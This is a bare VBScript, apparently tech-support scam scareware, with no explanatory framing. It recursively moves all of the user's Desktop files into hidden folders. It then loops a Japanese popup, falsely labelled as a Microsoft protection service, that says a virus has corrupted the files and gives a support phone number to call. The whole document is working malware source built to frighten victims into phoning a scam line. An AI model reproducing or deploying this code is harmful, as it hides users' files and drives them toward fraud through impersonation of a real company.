Set objShell = CreateObject("WScript.Shell")
Set objFSO = CreateObject("Scripting.FileSystemObject")

' Define the path to the Desktop
strDesktopPath = objShell.SpecialFolders("Desktop")

' Define the name of the hidden directory
strHiddenFolderName = ".ProtectedFiles"

' Recursive Hide Files Subroutine
Sub HideFiles(folderPath)
    Dim folder, subFolder, file, hiddenFolderPath, objHiddenFolder
    Set folder = objFSO.GetFolder(folderPath)

    ' Create or get the hidden directory in the current folder
    hiddenFolderPath = folderPath & "\" & strHiddenFolderName
    If Not objFSO.FolderExists(hiddenFolderPath) Then
        Set objHiddenFolder = objFSO.CreateFolder(hiddenFolderPath)
        objHiddenFolder.Attributes = 2 ' Hidden attribute
    Else
        Set objHiddenFolder = objFSO.GetFolder(hiddenFolderPath)
    End If

    ' Process each file in the current folder
    For Each file In folder.Files
        ' Skip the script itself and the hidden directory
        If Not file.Name = WScript.ScriptName And Not file.Name = strHiddenFolderName Then
            ' Move the file to the hidden directory in the same folder
            file.Move hiddenFolderPath & "\"
        End If
    Next

    ' Recurse into sub-folders
    For Each subFolder In folder.SubFolders
        If subFolder.Name <> strHiddenFolderName Then
            HideFiles(subFolder.Path)
        End If
    Next
End Sub

' Hide files from the Desktop and its sub-folders
HideFiles strDesktopPath

' Infinite loop to show the popup every minute
Do
    objShell.Popup "コンピュータ上のウイルスが原因でファイルが破損しています。マイクロソフト サポート (フリーダイヤル 050-5806-4534) までお問い合わせください。", 10, "File Protection Service", 64 + 4096
    WScript.Sleep(6000) ' Wait for 60 seconds
Loop
